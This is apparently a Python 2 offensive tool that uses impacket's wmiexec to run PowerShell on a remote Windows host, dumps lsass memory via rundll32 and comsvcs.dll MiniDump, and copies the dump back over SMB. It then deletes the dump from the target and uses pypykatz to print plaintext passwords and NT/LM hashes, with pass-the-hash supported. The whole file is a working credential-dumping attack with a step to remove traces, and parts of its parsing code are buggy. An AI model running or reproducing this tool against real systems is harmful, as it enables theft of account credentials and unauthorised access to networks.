#!/usr/bin/env python
'''
Using native client to dump lsass memory and analyse file with pypykatz

Created by DVS
'''

import subprocess, os, argparse, time, datetime, socket, base64, threading, Queue, hashlib, binascii, signal, sys, getpass
from optparse import OptionParser
from impacket.smbconnection import *
from impacket.nmb import NetBIOSError
import errno
import os
import sys
from os import listdir
from os.path import isfile, join
from datetime import datetime
import json
data = ""
fields = ['password','username','domainname','lmhash','nthash',]

copy = False
user = ""
wmiexec = "/opt/impacket/examples/wmiexec.py"
smbclient = "/opt/impacket/examples/smbclient.py"
def main(username, password, domain, target):
	host = target
	usern = username
	passwd = password
	dom = domain
	try:
		if len(passwd) < 64:
			getprocid = ("python {} {}/{}:{}@{} 'powershell -exec bypass -c \"Get-Process lsass | format-list ID |  Out-String\"'").format(wmiexec, dom, usern, passwd, host)
			procidrun = os.popen(getprocid).read()
			procid = procidrun.split(":")[1].split(" ")[1].strip()
			if "STATUS_LOGON_FAILURE" in procidrun:
				print "[-]	Wrong Creds!"
				sys.exit()
			elif "STATUS_ACCESS_DENIED" in procidrun:
				print "[-]	Failed to upload, STATUS_ACCESS_DENIED...Not a privileged user?"
				sys.exit()
			else:
				dumplssas = ("python {} {}/{}:{}@{} 'powershell -exec bypass -c C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll MiniDump {} C:\\{}-lsass.dmp full'").format(wmiexec, dom, username, passwd, host, procid, host)
				dumprun = os.popen(dumplssas).read()
				if "Errno Connection error" in dumprun:
					print "[-]	Connection Died"
					sys.exit()
				else:
					createdump = ("printf 'use C$\nget {}-lsass.dmp\n' > getdmp").format(host)
					createrun = os.popen(createdump).read()
					downdump = ("python {} {}/{}:{}@{} -f getdmp").format(smbclient, dom, usern, passwd, host)
					downrun = os.popen(downdump).read()
					cleanproc = ("python {} {}/{}:{}@{}  'del C:\{}-lsass.dmp'").format(wmiexec, dom, usern, passwd, host, host)
					cleanprocrun = os.popen(cleanproc).read()
					cleandump = ("rm getdmp")
					runcleandump = os.popen(cleandump).read()
					runpypy = ("pypykatz lsa minidump {}-lsass.dmp --json -o {}-dump 2>/dev/null").format(host, host)
					dopypy = os.popen(runpypy).read()
		if len(passwd) > 64:
			getprocid = ("python {} {}/{}@{} 'powershell -exec bypass -c \"Get-Process lsass | format-list ID |  Out-String\"' -hashes {} ").format(wmiexec, dom, usern, host, passwd)
			procidrun = os.popen(getprocid).read()
			procid = procidrun.split(":")[1].split(" ")[1].strip()
			if "STATUS_LOGON_FAILURE" in procidrun:
				print "[-]	Wrong Creds!"
				sys.exit()
			elif "STATUS_ACCESS_DENIED" in procidrun:
				print "[-]	Failed to upload, STATUS_ACCESS_DENIED...Not a privileged user?"
				sys.exit()
			else:
				dumplssas = ("python {} {}/{}@{} 'powershell -exec bypass -c 'C:\\\\Windows\\\\System32\\\\rundll32.exe C:\\\\windows\\\\System32\\\\comsvcs.dll MiniDump {} C:\\\\{}-lsass.dmp full'' -hashes {} ").format(wmiexec, dom, username, host, procid, host, passwd)
				dumprun = os.popen(dumplssas).read()
				if "Errno Connection error" in dumprun:
					print "[-]	Connection Died"
					sys.exit()
				else:
					createdump = ("printf 'use C$\nget {}-lsass.dmp\n' > getdmp").format(host)
					createrun = os.popen(createdump).read()
					downdump = ("python {} {}/{}@{} -f getdmp -hashes {}").format(smbclient, dom, usern, host, passwd)
					downrun = os.popen(downdump).read()
					cleanproc = ("python {} {}/{}@{} 'del C:\{}-lsass.dmp' -hashes {} ").format(wmiexec, dom, usern, host, host, passwd)
					cleanprocrun = os.popen(cleanproc).read()
					cleandump = ("rm getdmp")
					runcleandump = os.popen(cleandump).read()
					runpypy = ("pypykatz lsa minidump {}-lsass.dmp --json -o {}-dump 2>/dev/null").format(host, host)
					dopypy = os.popen(runpypy).read()




	except:	
		pass

if __name__ == "__main__":
        parser = argparse.ArgumentParser()
        parser.add_argument('-u', '--username', help='Enter Domain User')
        parser.add_argument('-p', '--password', help='Enter Domain password')
        parser.add_argument('-d', '--domain', help='Enter Domain name')
        parser.add_argument('-t', '--target', help='Target IP')
        args = parser.parse_args()
main(args.username, args.password, args.domain, args.target)
file_1 = args.target+"-dump"
now = datetime.now()
date_time = now.strftime("<%m/%d/%Y>[%H:%M:%S]")
with open(file_1, 'r') as json_file:
	data = json.load(json_file)
for key in data:
	for subkey1 in data[key]:
		for subkey2 in data[key][subkey1]:
			user = data[key][subkey1][subkey2]['username']
			if "nthash" in data[key][subkey1][subkey2] and user in data[key][subkey1][subkey2]:
				nt = data[key][subkey1][subkey2]['NThash']
				user = data[key][subkey1][subkey2]['username']
				domain =data[key][subkey1][subkey2]['domainname']
				print date_time+"\t"+args.target+"\t"+domain+"\\"+user+": aad3b435b51404eeaad3b435b51404ee:"+nt
			if "password" in data[key][subkey1][subkey2] and user in data[key][subkey1][subkey2]:
				passw = data[key][subkey1][subkey2]['password']
				user = data[key][subkey1][subkey2]['username']
				domain = data[key][subkey1][subkey2]['domainname']
				print date_time+"\t"+args.target+"\t"+domain+"\\"+user+": "+passw
			if "lmhash" in data[key][subkey1][subkey2] and user in data[key][subkey1][subkey2]:
				lm = data[key][subkey1][subkey2]['LMHash']
				user = data[key][subkey1][subkey2]['username']
				domain = data[key][subkey1][subkey2]['domainname']
				print date_time+"\t"+args.target+"\t"+domainname+"\\"+user+": "+lm
			for subkey3 in data[key][subkey1][subkey2]:
				if "[{" in str(data[key][subkey1][subkey2][subkey3]):
					for line in data[key][subkey1][subkey2][subkey3]:
						if "username" in line and "password" in line:
							if line['password'] is not None and "$" not in line['username']:
								print date_time+"\t"+args.target+"\t"+line['domainname']+"\\"+line['username']+": "+str(line['password'])
						if "username" in line and "NThash" in line:
							if line['NThash'] is not None and "$" not in line['username']:
								print date_time+"\t"+args.target+"\t"+line['domainname']+"\\"+line['username']+": aad3b435b51404eeaad3b435b51404ee:"+str(line['NThash'])
						if "username" in line and "LMHash" in line:
							if line['LMHash'] is not None and "$" not in line['username']:
								print date_time+"\t"+args.target+"\t"+line['domainname']+"\\"+line['username']+": "+str(line['LMHash'])
